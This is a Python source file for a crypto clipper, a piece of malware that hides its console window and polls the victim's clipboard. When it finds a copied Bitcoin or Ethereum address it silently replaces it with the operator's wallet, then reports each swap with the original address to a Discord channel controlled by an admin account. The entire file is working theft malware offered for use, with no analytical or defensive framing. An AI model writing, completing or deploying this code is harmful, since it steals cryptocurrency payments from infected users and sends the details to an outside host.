import discord
from discord import Embed
import re
import pyperclip
import ctypes
import asyncio
import time
from threading import Thread
TOKEN = 'YOUR_BOT_TOKEN_HERE'
ADMIN_ID = 123456789
CHANNEL_ID = 987654321
MY_BTC_ADDRESS = '1YourBTCWalletHere1234567890'
MY_ETH_ADDRESS = '0xYourETHWalletHere1234567890'
BTC_REGEX = r'^1[0-9A-Za-z]{25,34}$'
ETH_REGEX = r'^0x[0-9a-fA-F]{40}$'
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
async def on_ready():
    channel = client.get_channel(CHANNEL_ID)
    embed = Embed(color=0x000000)
    embed.title = "Clipper Status"
    embed.description = "Crypto clipper online, monitoring clipboard"
    await channel.send(embed=embed)
    Thread(target=clipper, daemon=True).start()
def clipper():
    last_clip = ''
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clip:
                last_clip = clip
                if re.match(BTC_REGEX, clip):
                    pyperclip.copy(MY_BTC_ADDRESS)
                    asyncio.run_coroutine_threadsafe(
                        client.get_channel(CHANNEL_ID).send(embed=Embed(
                            color=0x000000,
                            title="BTC Swap",
                            description=f"Swapped: {clip} -> {MY_BTC_ADDRESS}"
                        )),
                        client.loop
                    )
                elif re.match(ETH_REGEX, clip):
                    pyperclip.copy(MY_ETH_ADDRESS)
                    asyncio.run_coroutine_threadsafe(
                        client.get_channel(CHANNEL_ID).send(embed=Embed(
                            color=0x000000,
                            title="ETH Swap",
                            description=f"Swapped: {clip} -> {MY_ETH_ADDRESS}"
                        )),
                        client.loop
                    )
        except:
            pass
        time.sleep(0.5)
async def on_message(message):
    if message.author.id != ADMIN_ID or message.channel.id != CHANNEL_ID:
        return
    embed = Embed(color=0x000000)
    if message.content.lower() == '.cmds':
        embed.title = "Commands"
        embed.description = "`.cmds` - List commands\n`.status` - Check clipper status"
        await message.channel.send(embed=embed)
    elif message.content.lower() == '.status':
        embed.title = "Clipper Status"
        embed.description = "Clipper active, swapping BTC/ETH addresses [made by nero]"
        await message.channel.send(embed=embed)
client.event(on_ready)
client.event(on_message)
client.run(TOKEN)
